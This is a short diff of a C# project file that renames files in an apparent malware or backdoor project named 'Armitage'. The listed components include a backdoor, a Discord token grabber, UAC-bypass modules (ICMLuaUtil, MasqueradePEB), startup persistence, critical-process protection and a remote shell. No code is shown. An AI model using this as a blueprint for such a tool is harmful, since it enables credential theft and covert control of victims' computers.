@@ -121,12 +121,12 @@
     <Compile Include="Armitage\Backdoor.cs" />
     <Compile Include="Armitage\Compiler.cs" />
     <Compile Include="Armitage\Cookies\Cookie Clearer.cs" />
-    <Compile Include="Armitage\Cookies\DiscordToken.cs" />
+    <Compile Include="Armitage\Cookies\Discord Token.cs" />
     <Compile Include="Armitage\Critical Process.cs" />
     <Compile Include="Armitage\Startup.cs" />
     <Compile Include="Armitage\UAC\ICMLuaUtil.cs" />
     <Compile Include="Armitage\UAC\MasqueradePEB.cs" />
-    <Compile Include="Armitage\UAC\UACBypass.cs" />
+    <Compile Include="Armitage\UAC\UAC Bypass.cs" />
     <Compile Include="Armitage\Copy.cs" />
     <Compile Include="Armitage\Shell.cs" />
     <Compile Include="Armitage\Watchers\Filesystem.cs" />
@@ -150,7 +150,7 @@
       <DependentUpon>Resources.resx</DependentUpon>
     </Compile>
     <Compile Include="Utilities\Converter.cs" />
-    <Compile Include="Utilities\FilesAndDirectories.cs" />
+    <Compile Include="Utilities\Files And Pathing.cs" />
     <Compile Include="Utilities\Ranging.cs" />
     <Compile Include="Utilities\Updater.cs" />
   </ItemGroup>
